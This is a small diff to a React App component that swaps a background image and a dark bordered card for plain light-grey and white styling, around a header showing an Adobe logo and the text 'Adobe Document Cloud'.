@@ -45,12 +45,12 @@ function App() {
     <div  className="container-fluid">
     <div  className="row" >
     <div className="bg-image" 
-     style={{backgroundImage: "url('images/images/8.jpg')",
+     style={{backgroundColor: "#f0f0f0",
             height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
 
       <div  className="container">
         <div className="row">
-        <div  className="col-lg-6 mx-auto my-5 px-5 pb-5" style={{border: "1px solid",  backgroundColor: "rgba(0,0,0,0.7)", borderRadius:"15px"}}>
+        <div  className="col-lg-6 mx-auto my-5 px-5 pb-5" style={{  backgroundColor: "white", borderRadius:"15px"}}>
         <div  className="text-center pt-5"> 
                 <img src="images/images/adobe.jpg"  className="img-fluid" width="100px"/> <br/>
                 <span  className="h5 text-white">Adobe Document Cloud</span> <br/>
